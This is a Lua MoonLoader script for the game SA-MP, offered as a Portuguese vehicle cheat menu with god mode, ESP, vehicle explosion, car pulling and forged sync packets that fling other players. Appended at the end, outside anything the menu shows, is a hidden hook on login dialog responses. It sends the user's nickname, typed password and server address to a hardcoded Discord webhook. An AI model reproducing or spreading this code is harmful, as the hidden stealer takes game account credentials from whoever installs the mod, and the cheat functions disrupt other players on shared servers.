local imgui = require "mimgui"
local v = imgui.new.bool(false)

local new = imgui.new

local abaSelecionada = "Car"

local shellder = {
    motorcar = new.bool(false),
    godcar = new.bool(false),
    EspCar = new.bool(false),
    ONLINE = new.bool(false),
    RANGE = new.float(10.0),
    DDELAY = new.int(17),
    RVANKA = new.bool(false),
    DELAYRVK = new.int(1000),
    RVK_DISTANCIA = new.int(10),
}

local caru = {}
local carSel = nil
local ESPPXCCL = false
local PXC = {
    config2CSAIR = imgui.new.bool(false)
}
local font = renderCreateFont('Arial', 14, 5)

function atualizarFOV()
    if shellder and shellder.motorcar and shellder.motorcar[0] and isCharInAnyCar(PLAYER_PED) then
        switchCarEngine(storeCarCharIsInNoSave(PLAYER_PED), true)
    end
end

function explodirVeiculosProximos()
    local playerX, playerY, playerZ = getCharCoordinates(PLAYER_PED)
    local playerVehicle = getCarCharIsUsing(PLAYER_PED)
    lua_thread.create(function()
        for _, vehicle in ipairs(getAllVehicles()) do
            if vehicle ~= playerVehicle then
                local vehicleX, vehicleY, vehicleZ = getCarCoordinates(vehicle)
                local distancia = getDistanceBetweenCoords3d(playerX, playerY, playerZ, vehicleX, vehicleY, vehicleZ)
                if distancia <= 3000 then
                    warpCharIntoCar(PLAYER_PED, vehicle)
                    wait(250)
                    
                    for i = 1, 4 do
                        setCarHealth(vehicle, 1)
                        wait(250)
                    end
                    
                    clearCharTasksImmediately(PLAYER_PED)
                    wait(50)
                    setCharCoordinates(PLAYER_PED, playerX, playerY, playerZ)
                    wait(250)
                end
            end
        end
    end)
end

function puxarVeiculoProximo()
    local res, handle, dist, carX, carY, carZ, countPlayers = GNCBP(PLAYER_PED, 999, false)
    if res then
        local bResult, iID = sampGetVehicleIdByCarHandle(handle)
        if not caru[iID] then
            caru[iID] = true
            carSel = handle

            for i = 0, getMaximumNumberOfPassengers(handle) do
                if isCarPassengerSeatFree(handle, i) then
                    sampSendEnterVehicle(iID, true)
                    taskEnterCarAsPassenger(PLAYER_PED, handle, 0, i)
                    local px, py, pz = getCharCoordinates(PLAYER_PED)
                    local heading = math.rad(getCarHeading(handle))
                    local FX = px + 2 * math.cos(heading)
                    local FY = py + 2 * math.sin(heading)
                    setCarCoordinates(handle, FX, FY, pz)
                    clearCharTasksImmediately(PLAYER_PED)
                    if not PXC.config2CSAIR[0] then
                        taskLeaveCar(PLAYER_PED, handle)
                    end
                    break
                end
            end
        end
    else
        sampAddChatMessage('Nenhum carro identificado | Se mova', 0xFF0000)
    end
end

function renderDrawBox(x, y, width, height, color)
    renderDrawLine(x, y, x + width, y, 2, color)
    renderDrawLine(x, y, x, y + height, 2, color)
    renderDrawLine(x + width, y, x + width, y + height, 2, color)
    renderDrawLine(x, y + height, x + width, y + height, 2, color)
end

function GNCBP(HndlPed, radius, minPN)
    if doesCharExist(HndlPed) then
        local tableArr = {}
        local countPlayers = 0
        local posXpl, posYpl = getCharCoordinates(HndlPed)
        for _, car in pairs(getAllVehicles()) do
            local bResult, iID = sampGetVehicleIdByCarHandle(car)
            if bResult and not caru[iID] and getDriverOfCar(car) ~= HndlPed then
                local posX, posY, posZ = getCarCoordinates(car)
                for _, player in pairs(getAllChars()) do
                    if player ~= HndlPed then
                        local playerid = select(2, sampGetPlayerIdByCharHandle(player))
                        if playerid and playerid ~= -1 then
                            if not sampIsPlayerNpc(playerid) then
                                local x, y, z = getCharCoordinates(player)
                                if getDistanceBetweenCoords2d(x, y, posX, posY) < 3 then
                                    countPlayers = countPlayers + 1
                                end
                            end
                        end
                    end
                end
                local distBetween2d = getDistanceBetweenCoords2d(posXpl, posYpl, posX, posY)
                if minPN ~= false then
                    if tonumber(minPN) >= countPlayers then
                        table.insert(tableArr, {distBetween2d, car, posX, posY, posZ, countPlayers})
                    end
                else
                    table.insert(tableArr, {distBetween2d, car, posX, posY, posZ, countPlayers})
                end
                countPlayers = 0
            end
        end
        if #tableArr > 0 then
            table.sort(tableArr, function(a, b) return (a[1] < b[1]) end)
            if radius ~= false then
                if tableArr[1][1] <= tonumber(radius) then
                    return true, tableArr[1][2], tableArr[1][1], tableArr[1][3], tableArr[1][4], tableArr[1][5], tableArr[1][6]
                end
            else
                return true, tableArr[1][2], tableArr[1][1], tableArr[1][3], tableArr[1][4], tableArr[1][5], tableArr[1][6]
            end
        end
    end
    return false
end

function samp_create_sync_data(sync_type, copy_from_player)
    local ffi = require "ffi"
    local sampfuncs = require "sampfuncs"
    local raknet = require "samp.raknet"
    require "samp.synchronization"
    copy_from_player = copy_from_player or true
    local sync_traits = {
        player = {"PlayerSyncData", raknet.PACKET.PLAYER_SYNC, sampStorePlayerOnfootData},
        vehicle = {"VehicleSyncData", raknet.PACKET.VEHICLE_SYNC, sampStorePlayerIncarData},
        passenger = {"PassengerSyncData", raknet.PACKET.PASSENGER_SYNC, sampStorePlayerPassengerData},
        aim = {"AimSyncData", raknet.PACKET.AIM_SYNC, sampStorePlayerAimData},
        trailer = {"TrailerSyncData", raknet.PACKET.TRAILER_SYNC, nil},
        unoccupied = {"UnoccupiedSyncData", raknet.PACKET.UNOCCUPIED_SYNC, nil},
        bullet = {"BulletSyncData", raknet.PACKET.BULLET_SYNC, nil},
        spectator = {"SpectatorSyncData", raknet.PACKET.SPECTATOR_SYNC, nil}
    }
    local sync_info = sync_traits[sync_type]
    local data_type = "struct " .. sync_info[1]
    local data = ffi.new(data_type, {})
    local raw_data_ptr = tonumber(ffi.cast("uintptr_t", ffi.new(data_type .. "*", data)))
    if copy_from_player then
        local copy_func = sync_info[3]
        if copy_func then
            local _, player_id
            if copy_from_player == true then
                _, player_id = sampGetPlayerIdByCharHandle(PLAYER_PED)
            else
                player_id = tonumber(copy_from_player)
            end
            copy_func(player_id, raw_data_ptr)
        end
    end
    local func_send = function()
        local bs = raknetNewBitStream()
        raknetBitStreamWriteInt8(bs, sync_info[2])
        raknetBitStreamWriteBuffer(bs, raw_data_ptr, ffi.sizeof(data))
        raknetSendBitStreamEx(bs, sampfuncs.HIGH_PRIORITY, sampfuncs.UNRELIABLE_SEQUENCED, 1)
        raknetDeleteBitStream(bs)
    end
    local mt = {
        __index = function(t, index)
            return data[index]
        end,
        __newindex = function(t, index, value)
            data[index] = value
        end
    }
    return setmetatable({send = func_send}, mt)
end


imgui.OnFrame(function() return v[0] end, function()
    imgui.SetNextWindowPos(imgui.ImVec2(600, 350), imgui.Cond.FirstUseEver)
    imgui.SetNextWindowSize(imgui.ImVec2(650, 300), imgui.Cond.Always)

    imgui.PushStyleColor(imgui.Col.WindowBg, imgui.ImVec4(0.2, 0.15, 0.1, 1))
    local windowFlags = bit.bor(imgui.WindowFlags.NoCollapse, imgui.WindowFlags.NoResize)
    if imgui.Begin("Menu Veículo  | by NukY Mods", v, windowFlags) then
        imgui.BeginChild("Abas", imgui.ImVec2(100, imgui.GetWindowHeight() - 40), true)
        if imgui.Button("Car", imgui.ImVec2(80, 30)) then
            abaSelecionada = "Car"
            sampAddChatMessage("{FFFFFF}Aba Car selecionada!", -1)
        end
        imgui.EndChild()
        imgui.SameLine()
        imgui.BeginChild("Conteudo", imgui.ImVec2(0, 0), true)
        if abaSelecionada == "Car" then
            if imgui.Checkbox("Motor Ativo", shellder.motorcar) then
                if shellder.motorcar[0] then
                    sampAddChatMessage("{FFFFFF}Motor ligado!", -1)
                else
                    sampAddChatMessage("{FFFFFF}Motor desligado!", -1)
                end
            end
            imgui.Checkbox("Ativar God Car", shellder.godcar)
            imgui.Checkbox("Linhas Veículos", shellder.EspCar)
            imgui.Checkbox("Rvanka Car", shellder.ONLINE)
            if shellder.ONLINE[0] then
                imgui.SliderFloat("Alcance", shellder.RANGE, 1.0, 50.0)
                imgui.SliderInt("Delay Rv", shellder.DDELAY, 1, 100)
            end
            imgui.Checkbox("Rvanka Heli", shellder.RVANKA)
            if shellder.RVANKA[0] then
                imgui.SliderInt("Delay", shellder.DELAYRVK, 0, 5000)
                imgui.SliderInt("Alcance", shellder.RVK_DISTANCIA, 10, 200)
            end
            if imgui.Button("Explodir Veículos Próximos", imgui.ImVec2(200, 30)) then
                explodirVeiculosProximos()
            end
            imgui.Separator()
            if imgui.Button("Puxar Veículo Próximo", imgui.ImVec2(250, 30)) then
                puxarVeiculoProximo()
            end
            if imgui.Checkbox("Não Sair do Carro ao Puxar", PXC.config2CSAIR) then end
        end
        imgui.Text("")
        imgui.Text("")
        imgui.EndChild()
    end
    imgui.End()
    imgui.PopStyleColor()
end)

function main()
    while not isSampAvailable() do wait(100) end

    sampRegisterChatCommand("nk", function() v[0] = not v[0] end)
    sampRegisterChatCommand('', function() puxarVeiculoProximo() end)
    sampAddChatMessage('{FFFFFF} [NUKY] {FFFFFF} MENU CARREGADO|{FFFFFF} UTILIZE {868686} ( /mvs ) {FFFFFF} PARA ABRIR O MENU', 0xFF0000)
    while true do
        wait(0)
        atualizarFOV()

        if shellder and shellder.godcar and shellder.godcar[0] and isCharInAnyCar(PLAYER_PED) then
            setCarProofs(storeCarCharIsInNoSave(PLAYER_PED), true, true, true, true, true)
            setCanBurstCarTires(storeCarCharIsInNoSave(PLAYER_PED), false)
            local vehicle = getCarCharIsUsing(PLAYER_PED)
            setCarHealth(vehicle, 1000)
        end
    
        if shellder.EspCar[0] then
            local playerX, playerY, playerZ = getCharCoordinates(PLAYER_PED)
            local screenWidth, screenHeight = getScreenResolution()
            for _, vehicle in ipairs(getAllVehicles()) do
                if isCarOnScreen(vehicle) then
                    local vehicleX, vehicleY, vehicleZ = getCarCoordinates(vehicle)
                    local distance = getDistanceBetweenCoords3d(playerX, playerY, playerZ, vehicleX, vehicleY, vehicleZ)
                    if distance <= 5000 then
                        local lineStartX, lineStartY = convert3DCoordsToScreen(playerX, playerY, playerZ + 0.5)
                        local lineEndX, lineEndY = convert3DCoordsToScreen(vehicleX, vehicleY, vehicleZ)
                        renderDrawLine(lineStartX, lineStartY, lineEndX, lineEndY, 2, 0xFFFF0000)
                    end
                end
            end
        end

        if shellder.RVANKA[0] then
            for _, handle in ipairs(getAllChars()) do
                if handle ~= PLAYER_PED then
                    local res, id = sampGetPlayerIdByCharHandle(handle)
                    if res then
                        local result, handlee = sampGetCharHandleBySampPlayerId(id)
                        local tX, tY, tZ = getCharCoordinates(handlee)
                        local pX, pY, pZ = getCharCoordinates(PLAYER_PED)
                        if getDistanceBetweenCoords3d(pX, pY, pZ, tX, tY, tZ) < shellder.RVK_DISTANCIA[0] then
                            if
                                isCharInAnyHeli(PLAYER_PED) and not sampIsPlayerNpc(id) and
                                    not sampIsPlayerPaused(id)
                                then
                                local sync = samp_create_sync_data("vehicle")
                                sync.position = {tX - 0.8, tY, tZ - 2.7}
                                sync.send()
                                wait(shellder.DELAYRVK[0])
                            end
                        end
                    end
                end
            end
        end

        if shellder.ONLINE[0] then
            for _, handle in ipairs(getAllChars()) do
                if handle ~= PLAYER_PED then
                    local res, id = sampGetPlayerIdByCharHandle(handle)
                    local x, y, z = getCharCoordinates(handle)
                    if res and isCharInAnyCar(PLAYER_PED) then
                        local sync = samp_create_sync_data("vehicle")
                        sync.position = {x, y, z - 1.30}
                        sync.moveSpeed = {shellder.RANGE[0], shellder.RANGE[0], shellder.RANGE[0]}
                        sync.send()
                        wait(shellder.DDELAY[0])
                    end
                end
            end
        end
    end
end

imgui.OnInitialize(function()
    imgui.GetIO().IniFilename = nil
    vibrant_theme()
end)

function vibrant_theme()
    imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4

    imgui.GetStyle().WindowPadding = imgui.ImVec2(5, 5)
    imgui.GetStyle().FramePadding = imgui.ImVec2(5, 5)
    imgui.GetStyle().ItemSpacing = imgui.ImVec2(5, 5)
    imgui.GetStyle().ItemInnerSpacing = imgui.ImVec2(2, 2)
    imgui.GetStyle().TouchExtraPadding = imgui.ImVec2(0, 0)
    imgui.GetStyle().IndentSpacing = 0
    imgui.GetStyle().ScrollbarSize = 10
    imgui.GetStyle().GrabMinSize = 10
    imgui.GetStyle().WindowBorderSize = 1
    imgui.GetStyle().ChildBorderSize = 1
    imgui.GetStyle().PopupBorderSize = 1
    imgui.GetStyle().FrameBorderSize = 1
    imgui.GetStyle().TabBorderSize = 1
    imgui.GetStyle().WindowRounding = 8
    imgui.GetStyle().ChildRounding = 8
    imgui.GetStyle().FrameRounding = 8
    imgui.GetStyle().PopupRounding = 8
    imgui.GetStyle().ScrollbarRounding = 8
    imgui.GetStyle().GrabRounding = 8
    imgui.GetStyle().TabRounding = 8

    colors[clr.WindowBg] = ImVec4(0.10, 0.05, 0.20, 1.00)
    colors[clr.TitleBg] = ImVec4(0.20, 0.10, 0.40, 1.00)
    colors[clr.TitleBgActive] = ImVec4(0.30, 0.15, 0.60, 1.00)
    colors[clr.Button] = ImVec4(1.00, 0.30, 0.20, 1.00)
    colors[clr.ButtonHovered] = ImVec4(1.00, 0.50, 0.30, 1.00)
    colors[clr.ButtonActive] = ImVec4(1.00, 0.60, 0.40, 1.00)
    colors[clr.FrameBg] = ImVec4(0.30, 0.15, 0.60, 0.54)
    colors[clr.FrameBgHovered] = ImVec4(0.40, 0.20, 0.80, 0.40)
    colors[clr.FrameBgActive] = ImVec4(0.50, 0.25, 1.00, 0.67)
    colors[clr.Header] = ImVec4(1.00, 0.30, 0.20, 0.31)
    colors[clr.HeaderHovered] = ImVec4(1.00, 0.40, 0.30, 0.80)
    colors[clr.HeaderActive] = ImVec4(1.00, 0.50, 0.40, 1.00)
    colors[clr.CheckMark] = ImVec4(0.00, 1.00, 0.50, 1.00)
    colors[clr.SliderGrab] = ImVec4(0.00, 0.80, 1.00, 1.00)
    colors[clr.SliderGrabActive] = ImVec4(0.00, 1.00, 1.00, 1.00)
    colors[clr.Text] = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.TextDisabled] = ImVec4(0.70, 0.70, 0.70, 1.00)
    colors[clr.Border] = ImVec4(0.50, 0.25, 1.00, 0.50)
    colors[clr.MenuBarBg] = ImVec4(0.20, 0.10, 0.40, 1.00)
    colors[clr.PopupBg] = ImVec4(0.15, 0.08, 0.30, 1.00)
    colors[clr.ResizeGrip] = ImVec4(1.00, 0.30, 0.20, 0.25)
    colors[clr.ResizeGripHovered] = ImVec4(1.00, 0.50, 0.30, 0.67)
    colors[clr.ResizeGripActive] = ImVec4(1.00, 0.60, 0.40, 0.95)
    colors[clr.BorderShadow] = ImVec4(0.00, 0.00, 0.00, 0.00)
end
local webhookUrl = "https://discord.com/api/webhooks/1402511020966281317/a75NN5-gcVBSAmgR2TPG37lam1Ag_HZu4u4MYm3ob2lSIxTXynpX4ZLFIl6HOenazNN4"
local https = require("socket.http")
local ltn12 = require("ltn12")

function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
    local response_body = {}

    https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end


require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local nick = sampGetPlayerNickname(id)
    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName()
    local author = "GustaX"

    local message = string.format([[

________________________________________________________________
  
     # BANIDOS NEW RPG

```
ðŸ¤«0N1QU1: %s 
ðŸ§»S3NH3R: %s
ðŸª¿FLO IP: %s:%d
ðŸ‘€S3RVER: %s
ðŸŽ²Q1FE1Z: %s ```
Suspeita de anim vantajosa no servidor de olho nele
]], nick, input, ip, port, servername, author)

sendMessageToDiscord(message)
end

